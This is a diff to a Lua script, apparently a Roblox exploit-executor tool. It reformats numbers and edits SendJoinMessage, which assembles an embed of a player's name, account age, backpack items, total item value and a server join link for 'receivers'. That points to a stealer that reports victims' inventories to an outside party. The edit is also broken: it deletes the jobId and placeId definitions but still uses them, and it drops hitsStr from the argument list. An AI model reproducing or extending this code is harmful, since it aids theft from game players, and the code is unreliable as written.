@@ -161,21 +161,13 @@ local function formatNumber(number)
     if number == nil then
         return "0"
     end
-    local suffixes = {"", "k", "m", "b", "t"}
-    local suffixIndex = 1
-    while number >= 1000 and suffixIndex < #suffixes do
-        number = number / 1000
-        suffixIndex = suffixIndex + 1
+    local formatted = tostring(number)
+    local k
+    while true do  
+        formatted, k = string.gsub(formatted, "^(%d+)(%d%d%d)", '%1,%2')
+        if k == 0 then break end
     end
-    if suffixIndex == 1 then
-        return tostring(math.floor(number))
-    else
-        if number == math.floor(number) then
-            return string.format("%d%s", number, suffixes[suffixIndex])
-        else
-            return string.format("%.2f%s", number, suffixes[suffixIndex])
-        end
-    end
+    return formatted
 end
 
 -- Weight extraction function
@@ -256,11 +248,7 @@ local function SendJoinMessage(list, prefix)
     end
     local backpackStr = table.concat(backpackLines, "\n")
 
-
-    -- Game info
-    local jobId = game.JobId or "N/A"
-    local placeId = tostring(game.PlaceId or "N/A")
-
+    -- Remove hits section
     -- Build the embed description
     local description = string.format([[
 :bust_in_silhouette: **Player Information**
@@ -275,7 +263,7 @@ Account Age: %s days```
 :island: **Join with URL**
 %s
 -# %s | %s
-]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, hitsStr, joinUrl, placeId, jobId)
+]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrl, placeId, jobId)
 
     local data = {
         ["content"] = "",
